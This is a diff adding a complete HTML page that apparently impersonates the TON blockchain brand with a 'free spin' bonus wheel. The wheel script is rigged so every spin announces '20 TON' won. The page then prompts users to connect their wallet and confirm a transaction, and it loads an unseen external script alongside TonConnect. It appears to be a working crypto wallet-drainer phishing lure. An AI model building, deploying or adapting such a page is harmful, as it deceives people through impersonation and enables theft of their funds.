@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en" class=""
+  style="--tg-theme-accent-text-color: #ffda17; --tg-color-scheme: dark; --tg-theme-bg-color: #111922; --tg-theme-bottom-bar-bg-color: #111922; --tg-theme-button-color: #38699a; --tg-theme-button-text-color: #ffffff; --tg-theme-destructive-text-color: #ec3942; --tg-theme-header-bg-color: #111922; --tg-theme-hint-color: #56687a; --tg-theme-link-color: #58a7eb; --tg-theme-secondary-bg-color: #19232f; --tg-theme-section-bg-color: #111922; --tg-theme-section-header-text-color: #58a7eb; --tg-theme-section-separator-color: #0c131a; --tg-theme-subtitle-text-color: #56687a; --tg-theme-text-color: #f5f5f5; --tg-viewport-height: 100vh; --tg-viewport-stable-height: 100vh;">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://tonrewards.catcoln.xyz/Spin/Leader/favicon.ico">
+  <link rel="stylesheet" href="/ton-spin/files/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+  <link href="/ton-spin/files/aos.css" rel="stylesheet">
+  <link rel="stylesheet" href="/ton-spin/files/animate.min.css">
+  <title>TON SPIN</title>
+  <script src="/ton-spin/files/jquery.min.js"></script>
+  <script src="/ton-spin/files/telegram-web-app.js"></script>
+  <script src="/ton-spin/files/tonconnect-ui.min.js" defer=""></script>
+  <script src="/ton-spin/files/axios.min.js"></script>
+  <link rel="stylesheet" href="/ton-spin/files/sweetalert2.min.css">
+  <script src="/ton-spin/files/sweetalert2.min.js"></script>
+  <script src="/ton-spin/files/scriptt.js?NEW2" defer=""></script>
+  <script>
+    $(document).ready(function () {
+
+      $('a[href^="#"]').on('click', function (event) {
+        event.preventDefault();
+
+        var sc = $(this).attr("href"),
+          dn = $(sc).offset().top;
+
+        $('html, body').animate({
+          scrollTop: dn
+        }, 1000);
+      });
+    });
+
+
+    $(document).ready(function () {
+      var wheel = $("#wheel");
+      var spinButton = $("#spin-button");
+      var spinDuration = 5000;
+      var spinAngle = 1080;
+      var modal = $(".modal");
+      var hasSpun = localStorage.getItem("hasSpun");
+      localStorage.clear();
+      if (!hasSpun) {
+        spinButton.on("click", function () {
+          wheel.css("transition", "transform " + spinDuration + "ms ease-in-out");
+          wheel.css("transform", "rotate(" + spinAngle + "deg)");
+          setTimeout(function () {
+            wheel.css("transition", "none");
+            wheel.css("transform", "rotate(0deg)");
+          }, spinDuration);
+
+          setTimeout(function () {
+            modal.fadeIn('slow').addClass("modal_active");
+          }, 5500);
+
+          localStorage.setItem("hasSpun", true);
+        });
+      } else {
+        localStorage.setItem("hasSpun", true);
+        modal.addClass("modal_active");
+      }
+    });
+  </script>
+</head>
+
+
+<body ontouchstart="" style="top: auto;" class="tc-using-mouse">
+  <div class="root">
+    <div id="ton-connect" style="display: none;"></div>
+  </div>
+  <div class="modal">
+    <div class="modal_rect">
+      <div class="modal_rect_up">
+        <p class="modal_rect_up_tittle">CONGRATULATIONS! <br> you have won <span>20 TON</span></p>
+      </div>
+      <div class="modal_rect_bottom">
+        <div class="modal_rect_bottom_content">
+          <p class="modal_rect_bottom_text">Join us to claim reward</p>
+          <button class="modal_rect_bottom_button ton-connect" onclick="openButton()">CLAIM REWARD</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <section class="header">
+    <div class="container">
+      <div class="header_items">
+        <div class="header_item">
+          <a class="header_item_logo"><img class="ton-logo" src="/ton-spin/files/header_logo.svg" alt=""></a>
+        </div>
+        <div class="header_item">
+          <div class="header_item_socials">
+            <a href="https://twitter.com/ton_blockchain" target="_blank" class="header_item_social"><img
+                src="/ton-spin/files/header_twitter.svg" alt=""></a>
+            <a href="https://youtube.com/@the_open_network?si=1C27q9XJIvpuNG1u" target="_blank"
+              class="header_item_social"><img src="/ton-spin/files/header_yt.svg" alt=""></a>
+            <a href="https://t.me/tonblockchain" target="_blank" class="header_item_social"><img
+                src="/ton-spin/files/header_tg.svg" alt=""></a>
+            <a class="header_item_social"><img src="/ton-spin/files/header_mail.svg" alt=""></a>
+          </div>
+        </div>
+        <div class="header_item">
+          <button class="header_item_button ton-connect" id="cnbtn">
+            <div><tc-root></tc-root></div>
+          </button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="main">
+    <div class="container">
+      <h1 class="main_tittle">Welcome <span>bonus</span> <br> for ton users</h1>
+
+
+
+      <div class="main_wheel">
+        <div class="main_wheel_main">
+          <img src="/ton-spin/files/wheel_arrow.png" alt="" class="main_wheel_main_arrow">
+          <img src="/ton-spin/files/wheel_wheel.png" alt="" class="main_wheel_main_wheel" id="wheel">
+          <button class="main_wheel_main_button" id="spin-button">FREE SPIN</button>
+        </div>
+      </div>
+
+
+      <div class="main_faq">
+        <div class="main_faq_blocks">
+          <p class="main_faq_block"><img src="/ton-spin/files/main_one.svg" alt="">If you have received a qualification
+            notification in the form of NFT or USDT, click the button «FREE SPIN»</p>
+          <p class="main_faq_block"><img src="/ton-spin/files/main_two.svg" alt="">If you win reward in free spin, we
+            congratulate you!</p>
+          <p class="main_faq_block"><img src="/ton-spin/files/main_three.svg" alt="">Click «CLAIM REWARD», connect your
+            wallet and confirm in wallet received transaction</p>
+        </div>
+        <p class="main_faq_copy">Copyright © 2024 TON. All Rights Reserved</p>
+      </div>
+
+
+
+
+    </div>
+  </section>
+
+
+
+
+  <div id="tc-widget-root"><tc-root></tc-root></div>
+</body>
+
+</html>
